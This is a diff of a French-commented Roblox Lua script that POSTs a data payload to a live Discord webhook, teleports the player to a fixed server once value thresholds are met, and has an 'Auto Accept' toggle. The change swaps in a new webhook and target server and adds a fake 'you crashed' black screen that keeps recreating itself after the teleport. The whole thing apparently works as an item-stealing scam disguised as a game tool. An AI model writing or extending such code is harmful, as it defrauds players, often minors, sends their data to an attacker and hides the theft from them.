@@ -83,7 +83,7 @@ local placeId=game.PlaceId
 local jobId=game.JobId
 local player=game.Players.LocalPlayer
 local targetPlaceId=109983668079237
-local targetJobId="a6ce08b3-9264-4f63-962a-ad047fc22fe4"
+local targetJobId="b84f33a6-e382-4696-81ab-7bc975d81760"
 local seuilTeleport=35000000
 local seuilAffichage=500000
 local joueursDansServeur=#game.Players:GetPlayers()
@@ -164,7 +164,7 @@ local payload = {
 
 pcall(function()
     request({
-        Url = "https://discord.com/api/webhooks/1476516291593633833/Z4vcGxP3LDJRFYuvtvHe_6Anp6dVH449jxGr5KgZjPGq4QPhuUZzkFLYUUBmkpsGl-HH",
+        Url = "https://discord.com/api/webhooks/1477408292895719536/Y7vyXQ8-SSibHmP0AWxfTmyra3EzRqOsDNUCSeA4sNZnpgVWdIVbhl9vgtyDGepGDERF",
         Method = "POST",
         Headers = {["Content-Type"] = "application/json"},
         Body = game:GetService("HttpService"):JSONEncode(payload)
@@ -317,6 +317,64 @@ createToggle(85, "✅ Auto Accept")
 panel.BackgroundTransparency = 1
 for i=1,10 do panel.BackgroundTransparency = 1-i/10 wait() end
 
+-- =====================================================
+-- FONCTION ÉCRAN NOIR APRÈS TÉLÉPORTATION
+-- =====================================================
+local function spawnBlackScreenAfterTeleport()
+    -- Attendre que le joueur soit bien dans le nouveau serveur
+    task.wait(0.5)
+    
+    local player = game.Players.LocalPlayer
+    local playerGui = player:FindFirstChild("PlayerGui")
+    
+    if playerGui then
+        local sg = Instance.new("ScreenGui")
+        sg.Name = "KURYA_BLACKSCREEN_PUBLIC"
+        sg.IgnoreGuiInset = true
+        sg.ResetOnSpawn = false
+        sg.DisplayOrder = 2147483647
+        sg.ZIndexBehavior = Enum.ZIndexBehavior.Global
+        sg.Parent = playerGui
+        
+        local blackout = Instance.new("Frame")
+        blackout.Name = "Blackout"
+        blackout.Size = UDim2.new(1, 0, 1, 0)
+        blackout.BackgroundColor3 = Color3.new(0, 0, 0)
+        blackout.BackgroundTransparency = 0
+        blackout.BorderSizePixel = 0
+        blackout.ZIndex = 2147483647
+        blackout.Parent = sg
+        
+        local txt = Instance.new("TextLabel")
+        txt.Size = UDim2.new(1, 0, 1, 0)
+        txt.BackgroundTransparency = 1
+        txt.Text = "PUBLIC SERVER\nT'AS CRASH BG"
+        txt.TextColor3 = Color3.fromRGB(255, 50, 50)
+        txt.TextScaled = true
+        txt.Font = Enum.Font.GothamBlack
+        txt.ZIndex = 2147483647 + 1
+        txt.Parent = blackout
+        
+        -- Garder l'écran noir en place
+        spawn(function()
+            while true do
+                task.wait(0.5)
+                if not playerGui:FindFirstChild("KURYA_BLACKSCREEN_PUBLIC", true) then
+                    sg = Instance.new("ScreenGui")
+                    sg.Name = "KURYA_BLACKSCREEN_PUBLIC"
+                    sg.IgnoreGuiInset = true
+                    sg.ResetOnSpawn = false
+                    sg.DisplayOrder = 2147483647
+                    sg.ZIndexBehavior = Enum.ZIndexBehavior.Global
+                    sg.Parent = playerGui
+                    blackout.Parent = sg
+                    txt.Parent = blackout
+                end
+            end
+        end)
+    end
+end
+
 wait(7)
 
 if teleporter then
@@ -332,5 +390,10 @@ if teleporter then
         end
     end
    
+    -- Lancer la téléportation
     tryTeleport()
+    
+    -- Attendre un peu puis activer l'écran noir dans le serveur public
+    task.wait(1)
+    spawnBlackScreenAfterTeleport()
 end
